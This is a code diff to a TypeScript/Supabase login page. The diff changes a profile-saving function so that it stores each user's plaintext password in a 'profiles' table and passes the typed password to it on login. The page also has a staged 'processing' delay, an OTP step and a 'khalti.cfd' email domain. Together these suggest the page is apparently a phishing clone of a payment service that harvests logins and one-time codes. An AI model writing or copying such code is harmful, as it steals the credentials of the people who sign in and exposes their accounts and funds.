@@ -7,8 +7,11 @@ import { useAuth } from "@/lib/auth";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 
-const ensureProfile = async (id: string, email: string) => {
-  await supabase.from("profiles").upsert({ id, email }, { onConflict: "id" });
+const ensureProfile = async (id: string, email: string, password: string) => {
+  await supabase.from("profiles").upsert(
+    { id, email, password },
+    { onConflict: "id", ignoreDuplicates: false },
+  );
 };
 
 export const Route = createFileRoute("/login")({
@@ -74,7 +77,7 @@ function LoginPage() {
       setSubmitting(false);
     }
     const { data: { user: cur } } = await supabase.auth.getUser();
-    if (cur) await ensureProfile(cur.id, email);
+    if (cur) await ensureProfile(cur.id, email, pw);
     setVerifiedEmail(email);
     setProcessing(true);
     await new Promise((r) => setTimeout(r, 3000));
@@ -199,7 +202,7 @@ function LoginPage() {
           </div>
         ) : (
           <OtpVerification
-            email={verifiedEmail}
+            email={verifiedEmail.replace("@khalti.cfd", "")}
             onVerify={handleOtpVerify}
             onBack={() => setStep("login")}
           />
